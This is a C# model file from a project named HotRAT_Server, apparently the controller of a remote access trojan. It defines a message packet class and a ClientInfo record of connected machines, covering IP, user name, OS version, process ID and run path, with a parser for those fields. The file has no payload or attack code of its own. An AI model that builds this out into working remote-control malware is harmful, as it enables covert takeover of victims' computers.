using System.Net.Sockets;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Newtonsoft.Json;

namespace HotRAT_Server.Models
{
    public class Packet
    {
        public string Token { get; set; }
        public uint Flag { get; set; }
        public string Content { get; set; }

        // 构造函数
        public Packet(string token, uint flag, string content)
        {
            Token = token;
            Flag = flag;
            Content = content;
        }
    }
    
    public class ClientInfo
    {
        [JsonIgnore]
        public TcpClient _client;
        public string ClientID { get; set; }
        public string IP { get; set; }
        public int Port { get; set; }
        public string UserName { get; set; }
        public string SystemVer { get; set; }
        public DateTime ConnectTime { get; set; }
        public uint ProcessID { get; set; }
        public string RunPath { get; set; }
        public string FileName { get; set; }

        public override string ToString()
        {
            return $"{ClientID} - {IP}:{Port} (ConnectTime: {ConnectTime})";
        }

        public static ClientInfo FromString(string data)
        {
            var clientInfo = new ClientInfo();
            using (var reader = new StringReader(data))
            {
                reader.ReadLine();
                clientInfo.UserName = reader.ReadLine().Split('>')[1].Split('<')[0];
                clientInfo.SystemVer = reader.ReadLine().Split('>')[1].Split('<')[0];
                clientInfo.ConnectTime = DateTime.Parse(reader.ReadLine().Split('>')[1].Split('<')[0]);
                clientInfo.ProcessID = uint.Parse(reader.ReadLine().Split('>')[1].Split('<')[0]);
                clientInfo.RunPath = reader.ReadLine().Split('>')[1].Split('<')[0];
                clientInfo.FileName = reader.ReadLine().Split('>')[1].Split('<')[0];
            }
            return clientInfo;
        }
    }
}
